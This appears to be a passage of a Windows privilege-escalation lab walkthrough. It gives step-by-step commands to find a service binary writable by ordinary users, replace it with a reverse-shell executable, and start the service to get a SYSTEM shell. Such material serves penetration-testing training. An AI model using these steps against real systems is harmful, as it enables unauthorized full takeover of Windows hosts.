
1. **Query Service Configuration:**
   ```plaintext
   sc qc filepermsvc
   ```
   - Checks if the service runs with SYSTEM privileges.

2. **Check Executable Permissions Using icacls:**
   ```plaintext
   icacls "C:\Program Files\File Permissions Service\filepermservice.exe"
   ```
   - The output should show that "BUILTIN\Users" or "NT AUTHORITY\INTERACTIVE" has "F" (Full Control) or "M" (Modify) permissions for the service to be vulnerable.

3. **Check Executable Permissions Using AccessChk:**
   ```plaintext
   C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
   ```
   - Confirms that the service binary is writable by everyone.

4. **Overwrite Executable:**
   ```plaintext
   copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
   ```

5. **Exploit:**
   - Start a listener on Kali.
   - Start the service:
     ```plaintext
     net start filepermsvc
     ```
   - This spawns a reverse shell with SYSTEM privileges.
